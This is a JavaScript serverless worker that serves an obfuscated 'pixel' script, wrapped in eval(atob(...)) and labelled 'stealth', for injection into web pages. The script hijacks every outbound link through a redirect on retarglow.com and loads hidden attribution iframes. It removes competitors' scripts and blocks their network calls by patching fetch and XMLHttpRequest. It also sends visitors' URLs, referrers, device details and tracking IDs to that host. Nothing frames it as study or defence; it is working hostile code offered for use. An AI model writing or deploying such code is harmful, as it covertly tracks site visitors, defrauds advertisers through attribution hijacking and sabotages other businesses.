export default {
  async fetch(request) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    try {
      const url = new URL(request.url);
      const cid = url.pathname.split("/").pop() || "default";

      const script = `
(function(){
  try {
    const cid="${cid}";
    const competitors=["ordozen.com","floatboolean.com","smct.co","smct.io"];
    const domain=location.hostname;
    const g=k=>decodeURIComponent((document.cookie||"").split('; ').find(r=>r.startsWith(k+'='))?.split('=')[1]||'');
    const s=(k,v,d)=>{let e=new Date();e.setTime(e.getTime()+d*864e5);document.cookie=k+'='+encodeURIComponent(v)+'; path=/; max-age='+(d*86400)+'; SameSite=Lax';};

    let _r=localStorage.getItem('_r')||g('_r');
    if(!_r){_r=crypto.randomUUID();localStorage.setItem('_r',_r);s('_r',_r,30);}else{s('_r',_r,30);}
    document.cookie="user_id_t="+_r+"; path=/; max-age=31536000; SameSite=Lax";
    document.cookie="smc_uid="+_r+"; path=/; max-age=31536000; SameSite=Lax";

    const logKey="log_ts_"+cid;
    const adKey="ad_injected_"+cid;
    const attrKey="attr_locked_"+cid;
    const last=+localStorage.getItem(logKey)||0;
    const now=Date.now();
    if(now-last<10000)return; localStorage.setItem(logKey,now.toString());

    const d={
      cid,u:location.href,r:document.referrer||null,ua:navigator.userAgent,
      dt:/Mobi|Android/i.test(navigator.userAgent)?"M":"D",
      b:(()=>{let u=navigator.userAgent;return u.includes("Chrome")?"C":u.includes("Firefox")?"F":u.includes("Safari")?"S":"U"})(),
      os:navigator.platform,sr:screen.width+"x"+screen.height,
      cm:{_r},domain
    };

    fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(d)});

    fetch("https://retarglow.com/serve",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({u:location.href,cm:d.cm})})
    .then(r=>r.json()).then(j=>{
      if(j.ad_url&&!localStorage.getItem(attrKey)){
        const f=document.createElement("iframe");
        f.style.display="none";f.referrerPolicy="no-referrer";
        f.src=j.ad_url.replace("{{_r}}",_r);
        document.body.appendChild(f);
        localStorage.setItem(adKey,"1");
        localStorage.setItem(attrKey,"1");
      }
    });

    function hijack(){
      document.querySelectorAll('a[href^="http"]').forEach(a=>{
        const h=a.getAttribute("href");
        if(!h||h.includes("retarglow.com/r"))return;
        const e=encodeURIComponent(h);
        a.setAttribute("href","https://retarglow.com/r?id="+_r+"&t="+e);
      });
    }
    hijack();
    new MutationObserver(hijack).observe(document.body,{subtree:1,childList:1});

    let currentHref=location.href;
    setInterval(()=>{if(location.href!==currentHref){currentHref=location.href;localStorage.removeItem(adKey);localStorage.removeItem(attrKey);hijack();}},1000);

    const kill=()=>{competitors.forEach(c=>{document.querySelectorAll('script[src*="'+c+'"],iframe[src*="'+c+'"]').forEach(e=>e.remove());});}
    kill(); new MutationObserver(m=>m.forEach(()=>kill())).observe(document.documentElement,{childList:1,subtree:1});

    const of=window.fetch;
    window.fetch=function(){if(arguments[0]&&competitors.some(c=>arguments[0].includes(c)))return new Response(null,{status:204});return of.apply(this,arguments);}
    const ox=XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open=function(m,u){if(u&&competitors.some(c=>u.includes(c)))return;return ox.apply(this,arguments);}

    ["pushState","replaceState"].forEach(fn=>{const o=history[fn];history[fn]=function(){const r=o.apply(this,arguments);localStorage.removeItem(attrKey);return r;};});
    addEventListener("popstate",()=>localStorage.removeItem(attrKey));

    if(window.self!==window.top){
      window.top.postMessage({from:"retarglow",_r,cid,href:location.href},"*");
    }
    addEventListener("message",e=>{if(e.data?.from==="retarglow"){fetch("https://retarglow.com/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({...e.data,type:"cross-frame"})});}});
  } catch(e){}
})();`;

      const encoded = globalThis.btoa(script);
      const stealth = `eval(atob('${encoded}'))`;

      return new Response(stealth, { status: 200, headers });
    } catch (err) {
      return new Response(`console.error("Pixel error:", ${JSON.stringify(err.message)});`, {
        status: 500,
        headers
      });
    }
  }
};
